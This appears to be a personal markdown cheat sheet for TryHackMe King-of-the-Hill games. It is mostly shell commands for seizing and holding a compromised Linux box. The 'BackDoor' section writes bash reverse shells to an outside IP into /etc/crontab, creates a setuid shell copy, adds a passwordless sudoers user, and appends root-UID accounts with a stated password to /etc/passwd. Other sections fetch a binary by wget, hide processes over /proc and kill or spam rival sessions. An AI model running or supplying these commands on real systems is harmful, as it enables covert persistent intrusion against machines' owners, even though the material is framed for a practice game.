# Machine Tricks ✅📚
## Flag_finder ✅
```bash
grep -iR "THM{" / 2>/dev/null          # flag prefix
grep -R  "VEhN" / 2>/dev/null          # base64
grep -RE '[0-9a-f]{32}' . 2>/dev/null  # hash
find / -name "*flag*"  -ls 2>/dev/null
find / -type f -name "*flag.txt" -o -name ".flag*" -o -name "flag" -o -name "user.txt" -o -name "root.txt"  -ls 2>/dev/null
```
## KoTH Tricks ✅
### Be-king ✅
```bash
set write off
chattr -R +ia /root
chattr -R +ia /root/king.txt
rm -rf /usr/bin/chattr
echo "solcoteh" >| /root/king.txt
lessecho "solcoteh" > /root/king.txt
set -o noclobber /root/king.txt
sudo mount --bind -o ro /root/king.txt /root/king.txt 2>/dev/null

while true; do (echo -e 'solcoteh' > /root/king.txt); sleep 0.1; done 2>/dev/null &

echo "#!/bin/bash" > /usr/lib/yo.sh
echo 'echo "solcoteh" >| /root/king.txt' >> /usr/lib/yo.sh
echo "/usr/lib/chattr +i /root/king.txt" >> /usr/lib/yo.sh
chmod +x /usr/lib/yo.sh
(crontab -l 2>/dev/null; echo "* * * * * bash /usr/lib/yo.sh") | sudo crontab -
```

### BackDoor ✅
```bash

comando="/bin/bash -c 'bash -i >& /dev/tcp/$ip_address/$port_address 0>&1'"
echo "* * * * * root $comando" | sudo tee -a /etc/crontab > /dev/null-

echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.8.118.131/1337 0>&1'\" >> /etc/crontab

cp /bin/sh /home/sh && chmod u+s /home/sh

useradd ali && (echo -e 'Mobin@\nMobin@' | passwd ali) && (echo "ali ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers)

echo 'mobin:$1$8VO3cUZu$als/bleGjZ3SVjE5EGzvh/:0:0:root:/root:/bin/bash' >> /etc/passwd
echo 'mobin:$6$/LuWBv7L4QbfG1kf$pb0sFxOLHKiMNiAr2vMdpRc2e8mljxoUlm33fY6KEXLzcH7K51zegdnOYygurWuP/2.KW3eQvcBHXBn9/Jqnj0:0:0:root:/root:/bin/bash' >> /etc/passwd
password=Mobin@
```
### Not_Be-king ✅
```bash
chattr -R -ia /root
chattr -R -ia /root/king.txt

set +o noclobber /root/king.txt

sudo umount -l /root
sudo umount -l /root/king.txt

wget http://$ip_address:$port_address/chattr
chmod +x chattr
```
### mount-trick ✅
```bash
sudo lessecho solcoteh > /root/king.txt
sudo dd if=/dev/zero of=/dev/shm/root_f bs=1000 count=100
sudo mkfs.ext3 /dev/shm/root_f
sudo mkdir /dev/shm/sqashfs
sudo mount -o loop /dev/shm/root_f /dev/shm/sqashfs/
sudo chmod -R 777 /dev/shm/sqashfs/
sudo lessecho solcoteh > /dev/shm/sqashfs/king.txt
sudo mount -o ro,remount /dev/shm/sqashfs
sudo mount -o bind /dev/shm/sqashfs/king.txt /root/king.txt
sudo rm -rf /dev/shm/root_f 

mkdir /tmp/hidden
echo "$$" (Show our PID)
mount -o bind /tmp/hidden /proc/your-PID-here (Hide your PTS)

mkdir /dev/shm/.hidden && mount -o bind /dev/shm/.hidden /proc/$pid (Hide your PTS)
```
### symbolic-link-Tricks ✅
```bash
cp -r /root/ /dev/shm/...
cd /dev/shm/.../root
rm king.txt
echo "YourNick" > ...
ln -s ... king.txt
```
### Kill_enemy_shell ✅
```bash

tty (If you're looking for your pts id/number)
pkill -9 -t pts/<number>

ps aux
kill -9 $PID

find / -size 36464c 2>/dev/null ( find chattr )

cat /dev/urandom > /dev/pts/# ( sending spam for another user )
cat /dev/urandom > $dir 2>/dev/null

PATH=0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

cat /etc/shells (show available shells)
```
### Tools_Useful ✅
[pspy](https://github.com/DominicBreuker/pspy)
[chisel](https://github.com/jpillora/chisel)
[nyancat](https://github.com/klange/nyancat)
[linpeas.sh](https://github.com/peass-ng/PEASS-ng)
[LinEnum.sh](https://github.com/rebootuser/LinEnum)
[reverse_ssh](https://github.com/NHAS/reverse_ssh)
[linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
[linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2)
### disable_rootkit ✅
```bash
echo 1 > /proc/sys/kernel/modules_disabled
sudo sysctl -w kernel.modules_disabled=1
sudo sysctl -w module.sig_enforce=1
```
### Patched Services
```bash
sudo docker-compose down
sudo docker-compose build
docker-compose up --force-recreate -d
```
